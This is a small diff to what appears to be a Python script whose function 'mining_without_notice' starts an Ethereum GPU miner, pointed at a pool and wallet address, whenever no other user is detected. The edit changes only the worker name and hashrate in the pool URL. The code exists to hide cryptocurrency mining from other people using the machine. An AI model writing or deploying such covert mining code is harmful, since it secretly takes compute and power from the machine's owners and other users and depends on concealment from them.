@@ -28,7 +28,7 @@ def mining_without_notice():
     # open miner
     if someone_else_detected == False and mining_is_on == False:
         print('Open miner!')
-        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', 'http://ethereumpool.co/?miner=64@0x77209304F249d46DFA6Af187451A32bFeFd219e1@mip1080'], env=os.environ)
+        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', 'http://ethereumpool.co/?miner=46@0x77209304F249d46DFA6Af187451A32bFeFd219e1@mip1070'], env=os.environ)
         print('pid =', miner_process.pid)
         mining_is_on = True
 
